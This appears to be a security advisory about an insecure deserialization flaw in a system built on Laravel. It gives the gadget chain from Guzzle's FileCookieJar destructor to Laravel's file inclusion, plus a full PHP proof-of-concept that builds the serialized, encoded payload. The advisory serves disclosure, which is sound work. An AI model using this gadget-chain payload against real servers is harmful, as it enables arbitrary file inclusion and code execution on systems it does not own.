### Summary
An insecure deserialization vulnerability could allow an attacker to include and execute arbitrary PHP files on the server.

### Details
The deserialization call chain is ：
GuzzleHttp\Cookie\FileCookieJar#__destruct()
->Illuminate\View\View#__toString()
->Illuminate\View\View#render()
->Illuminate\View\View#renderContents()
->Illuminate\View\View#getContents()
->Illuminate\View\Engines\PhpEngine#get()
->Illuminate\View\Engines\PhpEngine#evaluatePath()
->Illuminate\Filesystem\Filesystem#getRequire() 
This is where file inclusion can be achieved：
![image](https://user-images.githubusercontent.com/73411761/218930860-494652ff-22d6-40da-b370-2b47d07ce53c.png)

### PoC
```
<?php
namespace GuzzleHttp\Cookie{

    use Illuminate\View\FileViewFinder;
    use Illuminate\View\View;
    use Illuminate\View\Factory;
    use Illuminate\View\Engines\PhpEngine;
    use Illuminate\View\Engines\EngineResolver;
    use Illuminate\Filesystem\Filesystem;

    class CookieJar{
        private $cookies = [];
        function __construct() {
            $this->cookies[] = [];
        }
    }

    class FileCookieJar extends CookieJar {
        private $filename;
        function __construct() {
            parent::__construct();
            $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new PhpEngine(new Filesystem()),1,"./info.php",["index"]);
        }
    }
}
namespace Illuminate\View{

    use Illuminate\Events\Dispatcher;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\View\Engines\EngineResolver;
    use Illuminate\View\Engines\PhpEngine;


    class FileViewFinder implements ViewFinderInterface{
        public function __construct(Filesystem $files, array $paths, array $extensions = null){}
    }
    interface ViewFinderInterface{}
    class Factory{
        protected $shared = [];
        public function __construct(EngineResolver $engines, ViewFinderInterface $finder)
        {
            $this->shared = [];
            $this->finder = $finder;
            $this->events = new Dispatcher();
            $this->engines = $engines;
        }
    }
    class View{
        protected $data;
        public function __construct(Factory $factory, PhpEngine $engine, $view, $path, $data = [])
        {
            $this->view = $view;
            $this->path = "The file to include";
            $this->engine = $engine;
            $this->factory = $factory;
            $this->data = [];
        }
    }
}
namespace Illuminate\View\Engines{

    use Illuminate\Filesystem\Filesystem;

    class PhpEngine{
        protected $files;
        public function __construct(Filesystem $files)
        {
            $this->files = $files;
        }
    }
}
namespace Illuminate\Filesystem{
    class Filesystem{

    }
}
namespace Illuminate\View\Engines{
    class EngineResolver{

    }
}
namespace Illuminate\Events{

    use Illuminate\Contracts\Events\Dispatcher as DispatcherContract;

    class Dispatcher implements DispatcherContract{

    }

}
namespace Illuminate\Contracts\Events{
    interface Dispatcher{};
}


namespace{

    use GuzzleHttp\Cookie\FileCookieJar;

    $pop = new FileCookieJar();
    echo urlencode(base64_encode(serialize($pop)));
}
```


### Impact
A deserialization vulnerability.
This vulnerability requires a deserialization point in the system to trigger, so the harm is not great.
Based on Laravel secondary development system.
